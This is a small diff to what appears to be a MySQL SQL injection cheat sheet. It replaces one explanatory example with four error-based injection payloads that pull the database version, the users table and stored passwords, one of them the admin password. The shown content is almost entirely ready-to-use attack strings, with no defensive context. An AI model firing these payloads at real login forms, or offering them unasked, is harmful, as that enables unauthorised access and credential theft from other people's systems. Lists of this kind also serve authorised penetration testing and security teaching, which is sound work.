@@ -1,7 +1,10 @@
 ### Mysql
-###### Identifying SQL Injection Vulnerabilities
+###### error-based
 ```
-select * from users where name = 'tom' or 1=1;#' and password = 'jones';
+admin' or 1=1 in (select @@version) --
+admin' OR 1=1 in (SELECT * FROM users) --
+admin' or 1=1 in (SELECT password FROM users) --
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') --
 ```
 
 ###### UNION-based Payloads
